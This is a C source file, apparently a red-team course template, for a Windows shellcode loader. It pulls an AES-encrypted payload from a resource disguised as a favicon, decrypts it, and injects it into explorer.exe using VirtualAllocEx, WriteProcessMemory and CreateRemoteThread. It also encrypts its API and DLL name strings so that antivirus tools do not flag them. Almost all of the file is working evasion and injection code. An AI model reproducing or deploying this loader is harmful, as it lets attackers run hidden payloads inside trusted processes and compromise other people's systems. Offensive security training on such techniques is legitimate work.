/*

 Red Team Operator course code template
 classic code injection
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include "resources.h"

LPVOID (WINAPI * pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
BOOL (WINAPI * pWriteProcessMemory)(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten);
HANDLE (WINAPI * pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags,LPDWORD lpThreadId);
LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
FARPROC (WINAPI * pGetProcAddress)(HMODULE hModule, LPCSTR  lpProcName);
HANDLE (WINAPI * pOpenProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
VOID (WINAPI * pRtlMoveMemory)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);
HRSRC (WINAPI * pFindResourceA)(HMODULE hModule,LPCSTR  lpName,LPCSTR  lpType);
HGLOBAL (WINAPI * pLoadResource)(HMODULE hModule, HRSRC hResInfo);
LPVOID (WINAPI * pLockResource)(HGLOBAL hResData);

char key[] = { 0x6f, 0x62, 0x61, 0x6d, 0x61 };
unsigned char sKernel32[] = { 0xc6, 0x6e, 0x50, 0x6b, 0x1b, 0x6f, 0x53, 0x28, 0x84, 0xce, 0x5c, 0x69, 0x86, 0xb9, 0x4, 0x95 };
unsigned char sNtDll[]= { 0x8a, 0xeb, 0xe, 0x3f, 0x7e, 0x80, 0x8c, 0x4b, 0x58, 0xd9, 0x26, 0x10, 0x97, 0xdd, 0xb2, 0x34 };

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
		
		                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}

int decrypt_string (char * eString, unsigned int eLength) {
	
	AESDecrypt((char *) eString, eLength, key, sizeof(key));
	
	return 0;
}



int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;
		unsigned char sVirtualAllocEx[] = { 0xba, 0x1, 0x91, 0xc7, 0xb5, 0x3f, 0x1a, 0xd0, 0xeb, 0x99, 0x13, 0xea, 0x77, 0x9a, 0xd1, 0xd8 };
		unsigned char sWriteProcessMemory[] = { 0x41, 0xcd, 0xb, 0x29, 0x3a, 0x2a, 0x60, 0xdf, 0xc, 0xd4, 0x8d, 0x81, 0x30, 0xac, 0xc4, 0x8a, 0x9a, 0x32, 0x3c, 0x64, 0xad, 0x34, 0xac, 0x16, 0xa2, 0x8a, 0xe0, 0xff, 0xe7, 0x33, 0xe7, 0x38 };
		unsigned char sCreateRemoteThread[] = { 0xc0, 0x35, 0xd2, 0x2f, 0x48, 0x73, 0x30, 0xb, 0xba, 0xdf, 0xe, 0x4c, 0x99, 0x11, 0x63, 0xce, 0x7d, 0x0, 0x74, 0x2f, 0x28, 0x48, 0xd3, 0x57, 0xaa, 0xe5, 0x1c, 0xb1, 0x3, 0xc5, 0x46, 0x44 };
		unsigned char sGetProcAddress[] = { 0x3f, 0x58, 0x44, 0xf0, 0xe1, 0x56, 0x78, 0xbf, 0x1c, 0x1d, 0xf4, 0xd8, 0x89, 0xc7, 0x54, 0x78 };
		
		//decrypt and init VirtualAllocEx. First decrypt DLL string
		//AESDecrypt((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
		decrypt_string(sVirtualAllocEx, sizeof(sVirtualAllocEx));
		decrypt_string(sGetProcAddress, sizeof(sGetProcAddress));
		
		pVirtualAllocEx = GetProcAddress(GetModuleHandle(sKernel32), sVirtualAllocEx);
        pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
		
		//decrypt and init WriteProcessMemory
		AESDecrypt((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
		pWriteProcessMemory = GetProcAddress(GetModuleHandle(sKernel32), sWriteProcessMemory);
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
		
		//decrypt and init CreateRemoteThread
		AESDecrypt((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
		pCreateRemoteThread = GetProcAddress(GetModuleHandle(sKernel32), sCreateRemoteThread);
        hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {
	
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payload;
	unsigned int payload_len;
	unsigned char sExplorer[] = { 0xc1, 0x2, 0xf3, 0x31, 0x2a, 0x4f, 0x11, 0xf8, 0x6, 0xfd, 0x8f, 0xc6, 0x84, 0x1b, 0xbe, 0x64 };
	unsigned char sVirtualAlloc[] = { 0xfb, 0xe, 0x8c, 0xf4, 0x74, 0x4, 0xe0, 0xbe, 0xae, 0xed, 0xf2, 0x4f, 0x92, 0xc3, 0x92, 0x49 };
	unsigned char sOpenProcess[] = { 0x2a, 0xa8, 0xbf, 0x13, 0xe6, 0xf4, 0xe0, 0x6c, 0x42, 0xc9, 0x69, 0xe4, 0xdb, 0xa, 0xb2, 0x2f }; 
	unsigned char sRtlMoveMemory[] = { 0xd3, 0x22, 0xb8, 0x48, 0xbf, 0x61, 0x2a, 0x13, 0x30, 0x41, 0x85, 0x78, 0x54, 0x78, 0x96, 0xcb };
	unsigned char sFindResourceA[] = { 0xb, 0x26, 0xe6, 0xe4, 0xc3, 0x8f, 0x1f, 0x9e, 0x4e, 0x14, 0x6e, 0x8, 0xeb, 0x18, 0x10, 0x4b };
	unsigned char sLoadResource[] = { 0x77, 0x9f, 0x8c, 0x7e, 0x2, 0xfa, 0x5a, 0x3f, 0xd0, 0x6d, 0x31, 0x3, 0x35, 0x23, 0x2f, 0xba };
	unsigned char sLockResource[] = { 0x28, 0x5f, 0x48, 0x5a, 0xda, 0x9c, 0x8d, 0xc5, 0x6f, 0xa0, 0xf7, 0x64, 0xb0, 0xb4, 0x20, 0xa0 };

	
	
	//decrypt kernel32 string 
	decrypt_string(sKernel32, sizeof(sKernel32));
	decrypt_string(sFindResourceA, sizeof(sFindResourceA));
	
	
	// Extract payload from resources section
	pFindResourceA = GetProcAddress(GetModuleHandle(sKernel32), sFindResourceA);
	res = pFindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	//printf("%x", res);
	decrypt_string(sLoadResource, sizeof(sLoadResource));
	pLoadResource = GetProcAddress(GetModuleHandle(sKernel32), sLoadResource);
	resHandle = pLoadResource(NULL, res);
	
	decrypt_string(sLockResource, sizeof(sLockResource));
	pLockResource = GetProcAddress(GetModuleHandle(sKernel32), sLockResource);
	payload = (char *) pLockResource(resHandle);
	payload_len = SizeofResource(NULL, res);

	
	// Allocate some memory buffer for payload
	decrypt_string(sVirtualAlloc, sizeof(sVirtualAlloc));
	pVirtualAlloc = GetProcAddress(GetModuleHandle(sKernel32), sVirtualAlloc);
	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	//printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	//printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new memory buffer
	decrypt_string (sRtlMoveMemory, sizeof(sRtlMoveMemory));
	decrypt_string (sNtDll, sizeof(sNtDll));
	pRtlMoveMemory = GetProcAddress(GetModuleHandle(sNtDll), sRtlMoveMemory);
	pRtlMoveMemory(exec_mem, payload, payload_len);
	
	// Decrypt payload 
	AESDecrypt((char *) exec_mem, payload_len, key, sizeof(key));
	
	int pid = 0;
    HANDLE hProc = NULL;
	
	decrypt_string(sExplorer, sizeof(sExplorer));
	pid = FindTarget(sExplorer);
	
	decrypt_string(sOpenProcess, sizeof(sOpenProcess));
	pOpenProcess = GetProcAddress(GetModuleHandle(sKernel32), sOpenProcess);

	if (pid) {
		//printf("notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		//printf("hProc = %x\n", hProc);
		getchar();
		if (hProc != NULL) {
			Inject(hProc, exec_mem, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
